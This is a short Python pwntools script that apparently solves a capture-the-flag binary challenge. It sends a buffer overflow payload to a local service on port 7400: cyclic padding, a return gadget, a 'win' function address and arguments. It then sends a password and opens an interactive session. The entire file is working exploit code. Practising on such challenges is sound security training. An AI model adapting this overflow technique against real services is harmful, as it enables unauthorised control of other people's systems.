from pwn import *

p = remote("127.0.0.1",7400)

win = p32(0x08049211)

ret = p32(0x40101a)

pay = cyclic(24)

pay += ret

pay += win

pay += p32(0x0)
pay += p32(0x1337)


print(p.recv().decode())

p.sendline(pay)

print(p.recv().decode())
p.sendline(b'LETMEWIN')
p.interactive()
